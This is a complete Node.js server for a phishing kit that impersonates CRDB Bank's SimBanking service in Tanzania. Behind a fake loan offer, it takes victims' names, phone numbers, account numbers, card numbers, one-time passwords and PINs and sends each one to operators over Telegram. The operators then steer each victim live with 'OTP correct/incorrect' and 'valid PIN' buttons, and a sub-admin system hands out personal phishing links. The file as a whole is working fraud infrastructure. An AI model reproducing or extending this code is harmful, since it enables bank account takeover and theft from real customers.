/**
 * **CRDB SIMBANKING TANZANIA - SECURE MULTI-ADMIN SERVER**
 * Updated with Main Admin Authorization Control & Unique Sub-Admin Links.
 */

const express = require('express');
const path = require('path');
const fs = require('fs');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

const sessions = {};

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.TOKEN || 'YOUR_BOT_TOKEN';
const FALLBACK_ADMIN_ID = process.env.TELEGRAM_CHAT_ID || process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8845346118';
const APP_URL = process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : 'http://localhost:3000');

const ADMINS_FILE = path.join(__dirname, 'admins.json');

function loadAdmins() {
  try {
    if (fs.existsSync(ADMINS_FILE)) {
      const data = fs.readFileSync(ADMINS_FILE, 'utf8');
      const parsed = JSON.parse(data);
      const entries = Array.isArray(parsed) ? parsed : [];
      return new Map(entries.map(([id, rec]) => [id, {
        authorized: rec?.authorized ?? false,
        username: rec?.username || '',
        firstName: rec?.firstName || 'User',
        lastName: rec?.lastName || '',
        status: rec?.status || 'PENDING'
      }]));
    }
  } catch (err) {
    console.error('[Storage] Error loading admins file:', err);
  }
  return new Map();
}

function saveAdmins() {
  try {
    const serialized = JSON.stringify(Array.from(admins.entries()));
    fs.writeFileSync(ADMINS_FILE, serialized, 'utf8');
  } catch (err) {
    console.error('[Storage] Error saving admins file:', err);
  }
}

const admins = loadAdmins();

function resolveTargetChat(adminParam) {
  if (adminParam && String(adminParam).trim() !== '') {
    const targetAdmin = String(adminParam).trim();
    if (targetAdmin === String(FALLBACK_ADMIN_ID)) {
      return FALLBACK_ADMIN_ID;
    }
    const adminRecord = admins.get(targetAdmin);
    if (adminRecord && adminRecord.authorized) {
      return targetAdmin;
    }
  }
  return FALLBACK_ADMIN_ID || null;
}

async function sendTelegramMessage(chatId, text, replyMarkup = null) {
  if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN') {
    console.log('Telegram token not configured. Message:', text);
    return;
  }
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const body = {
    chat_id: chatId,
    text: text,
    parse_mode: 'HTML'
  };
  if (replyMarkup) {
    body.reply_markup = replyMarkup;
  }
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    return await response.json();
  } catch (err) {
    console.error('Telegram error:', err);
  }
}

app.post('/api/submit', async (req, res) => {
  const { step, data, clientId, adminChatId } = req.body;
  if (!sessions[clientId]) sessions[clientId] = {};
  
  let targetAdmin = resolveTargetChat(adminChatId);
  if (!targetAdmin) targetAdmin = FALLBACK_ADMIN_ID;

  sessions[clientId] = { ...sessions[clientId], ...data, currentStep: step, status: 'pending', adminChatId: targetAdmin };

  if (step === 'account_details') {
    const text = `<b>[CRDB SIMBANKING TANZANIA] New Loan & Account Submission</b>\n` +
                 `Loan Amount: ${sessions[clientId].loanAmount || 'N/A'}\n` +
                 `First Name: ${sessions[clientId].firstName || 'N/A'}\n` +
                 `Last Name: ${sessions[clientId].lastName || 'N/A'}\n` +
                 `Phone (+255): ${sessions[clientId].phone || 'N/A'}\n` +
                 `Account Number: ${data.accountNumber}\n` +
                 `Card Number: ${data.cardNumber}`;
    
    const replyMarkup = {
      inline_keyboard: [
        [
          { text: 'WRONG DETAILS', callback_data: `wrong_details_${clientId}` },
          { text: 'CORRECT DETAILS', callback_data: `correct_details_${clientId}` }
        ]
      ]
    };
    await sendTelegramMessage(targetAdmin, text, replyMarkup);
  } else if (step === 'resend_otp') {
    const text = `<b>[CRDB] User requested to RESEND OTP (♻️ Tuma OTP tena)</b>\nClient ID: ${clientId}`;
    const replyMarkup = {
      inline_keyboard: [
        [
          { text: 'OTP CORRECT', callback_data: `otp_correct_${clientId}` },
          { text: 'OTP INCORRECT', callback_data: `otp_incorrect_${clientId}` }
        ]
      ]
    };
    await sendTelegramMessage(targetAdmin, text, replyMarkup);
  } else if (step === 'otp_submitted') {
    const text = `<b>[CRDB] OTP Submitted:</b> ${data.otp}\nClient ID: ${clientId}`;
    const replyMarkup = {
      inline_keyboard: [
        [
          { text: 'OTP CORRECT', callback_data: `otp_correct_${clientId}` },
          { text: 'OTP INCORRECT', callback_data: `otp_incorrect_${clientId}` }
        ]
      ]
    };
    await sendTelegramMessage(targetAdmin, text, replyMarkup);
  } else if (step === 'pin_submitted') {
    const text = `<b>[CRDB] PIN Submitted:</b> ${data.pin}\nClient ID: ${clientId}`;
    const replyMarkup = {
      inline_keyboard: [
        [
          { text: '3 INVALID PIN', callback_data: `invalid_pin_${clientId}` },
          { text: 'VALID PIN', callback_data: `valid_pin_${clientId}` },
          { text: 'LOAN APPROVED', callback_data: `loan_approved_${clientId}` }
        ]
      ]
    };
    await sendTelegramMessage(targetAdmin, text, replyMarkup);
  }

  res.json({ success: true, status: sessions[clientId].status });
});

app.get('/api/status/:clientId', (req, res) => {
  const clientId = req.params.clientId;
  const session = sessions[clientId] || { status: 'pending' };
  res.json(session);
});

app.post('/api/telegram-webhook', async (req, res) => {
  const update = req.body;
  
  if (update.message && update.message.text) {
    const msg = update.message;
    const chatId = String(msg.chat.id);
    const text = msg.text.trim();
    const firstName = msg.from.first_name || 'User';
    const lastName = msg.from.last_name || '';
    const username = msg.from.username || '';

    if (text.startsWith('/start')) {
      if (chatId === String(FALLBACK_ADMIN_ID)) {
        await sendTelegramMessage(chatId, `👑 Karibu Msimamizi Mkuu. Kiungo chako cha mfumo: ${APP_URL}`);
        res.sendStatus(200);
        return;
      }

      if (!admins.has(chatId)) {
        admins.set(chatId, {
          authorized: false,
          username,
          firstName,
          lastName,
          startedAt: new Date()
        });
        saveAdmins();
      }

      const record = admins.get(chatId);

      if (!record.authorized) {
        // Notify Main Admin with authorization choices
        const adminNotifyText = `🚨 <b>New Sub-Admin Pending Authorization!</b>\n\n` +
                                `👤 User: @${username || firstName} (${firstName} ${lastName})\n` +
                                `🆔 Chat ID: <code>${chatId}</code>`;
        
        const authMarkup = {
          inline_keyboard: [
            [
              { text: '✅ Authorize', callback_data: `AUTH_YES_${chatId}` },
              { text: '❌ Reject', callback_data: `AUTH_NO_${chatId}` }
            ]
          ]
        };
        await sendTelegramMessage(FALLBACK_ADMIN_ID, adminNotifyText, authMarkup);

        // Instruct sub-admin to contact Super Main Admin
        await sendTelegramMessage(chatId, `👋 Karibu <b>${firstName}</b>!\n\n⚠️ Akaunti yako kwa sasa <b>inasubiri idhini</b> kutoka kwa Msimamizi Mkuu (Super Main Admin).\n\nTafadhali wasiliana na Msimamizi Mkuu ili kupitishwa na kupokea kiungo chako maalum.`);
        res.sendStatus(200);
        return;
      }

      const userLink = `${APP_URL}/?admin=${chatId}`;
      await sendTelegramMessage(chatId, `👋 Karibu tena <b>${firstName}</b>!\n\n🔗 Kiungo chako maalum:\n${userLink}`);
      res.sendStatus(200);
      return;
    }
  }

  if (update.callback_query) {
    const callbackData = update.callback_query.data;
    const chatId = String(update.callback_query.message.chat.id);
    const messageId = update.callback_query.message.message_id;
    
    // Handle Main Admin Sub-Admin Authorization Actions
    if (callbackData.startsWith('AUTH_YES_') || callbackData.startsWith('AUTH_NO_')) {
      if (chatId !== String(FALLBACK_ADMIN_ID)) {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ callback_query_id: update.callback_query.id, text: 'Unauthorized action.' })
        });
        return res.sendStatus(200);
      }

      const parts = callbackData.split('_');
      const decision = parts[1]; // YES or NO
      const targetSubId = parts[2];
      const subRecord = admins.get(targetSubId);

      if (subRecord) {
        if (decision === 'YES') {
          subRecord.authorized = true;
          saveAdmins();
          const assignedLink = `${APP_URL}/?admin=${targetSubId}`;
          await sendTelegramMessage(targetSubId, `🎉 Hongera! Akaunti yako ya usimamizi imeidhinishwa.\n\n🔗 Kiungo chako maalum:\n${assignedLink}`);
          await sendTelegramMessage(chatId, `✅ Sub-Admin ID <code>${targetSubId}</code> has been authorized successfully.`);
        } else {
          admins.delete(targetSubId);
          saveAdmins();
          await sendTelegramMessage(targetSubId, `❌ Ombi lako la usimamizi limekataliwa na Msimamizi Mkuu.`);
          await sendTelegramMessage(chatId, `❌ Sub-Admin ID <code>${targetSubId}</code> was rejected and removed.`);
        }
      }

      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ callback_query_id: update.callback_query.id, text: 'Processed' })
      });

      try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: [] } })
        });
      } catch (e) {}

      return res.sendStatus(200);
    }

    let action = '';
    let clientId = '';

    if (callbackData.startsWith('loan_approved_')) {
      action = 'loan_approved';
      clientId = callbackData.replace('loan_approved_', '');
    } else if (callbackData.startsWith('wrong_details_')) {
      action = 'wrong_details';
      clientId = callbackData.replace('wrong_details_', '');
    } else if (callbackData.startsWith('correct_details_')) {
      action = 'correct_details';
      clientId = callbackData.replace('correct_details_', '');
    } else if (callbackData.startsWith('otp_correct_')) {
      action = 'otp_correct';
      clientId = callbackData.replace('otp_correct_', '');
    } else if (callbackData.startsWith('otp_incorrect_')) {
      action = 'otp_incorrect';
      clientId = callbackData.replace('otp_incorrect_', '');
    } else if (callbackData.startsWith('invalid_pin_')) {
      action = 'invalid_pin';
      clientId = callbackData.replace('invalid_pin_', '');
    } else if (callbackData.startsWith('valid_pin_')) {
      action = 'valid_pin';
      clientId = callbackData.replace('valid_pin_', '');
    }

    if (!sessions[clientId]) sessions[clientId] = {};

    if (action === 'wrong_details') sessions[clientId].status = 'wrong_details';
    else if (action === 'correct_details') sessions[clientId].status = 'correct_details';
    else if (action === 'otp_correct') sessions[clientId].status = 'otp_correct';
    else if (action === 'otp_incorrect') sessions[clientId].status = 'otp_incorrect';
    else if (action === 'invalid_pin') sessions[clientId].status = 'invalid_pin';
    else if (action === 'valid_pin') sessions[clientId].status = 'valid_pin';
    else if (action === 'loan_approved') sessions[clientId].status = 'loan_approved';

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: update.callback_query.id, text: 'Recorded successfully' })
    });

    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          message_id: messageId,
          reply_markup: { inline_keyboard: [] }
        })
      });
    } catch (err) {
      console.error('Error clearing buttons:', err);
    }
  }
  res.sendStatus(200);
});

app.listen(PORT, () => {
  console.log(`CRDB Server running on port ${PORT}`);
});
    
